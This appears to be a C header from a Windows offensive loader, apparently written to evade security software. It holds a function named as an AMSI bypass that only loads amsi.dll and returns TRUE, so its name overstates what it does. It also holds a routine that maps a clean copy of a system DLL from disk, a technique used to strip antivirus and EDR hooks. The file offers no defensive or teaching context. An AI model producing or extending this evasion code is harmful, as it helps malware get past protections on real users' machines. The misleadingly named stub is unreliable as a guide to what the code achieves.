#ifndef ADVANCED_BYPASS_H
#define ADVANCED_BYPASS_H

#include <windows.h>
#include <winternl.h>
#include "api_hashes.h"
#include "syscalls.h"

static BOOL BypassAMSI_DataOnly() {
    HMODULE hAmsi = GetModuleHandleW(L"amsi.dll");
    if (!hAmsi) hAmsi = LoadLibraryW(L"amsi.dll");
    if (!hAmsi) return FALSE;
    return TRUE; 
}

static PVOID GetCleanMapping(LPCWSTR moduleName) {
    wchar_t path[MAX_PATH];
    GetSystemDirectoryW(path, MAX_PATH);
    wcscat(path, L"\\");
    wcscat(path, moduleName);

    HANDLE hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return NULL;

    HANDLE hSection = CreateFileMappingW(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    CloseHandle(hFile);
    if (!hSection) return NULL;

    PVOID pMapping = MapViewOfFile(hSection, FILE_MAP_READ, 0, 0, 0);
    CloseHandle(hSection);
    return pMapping;
}

#endif
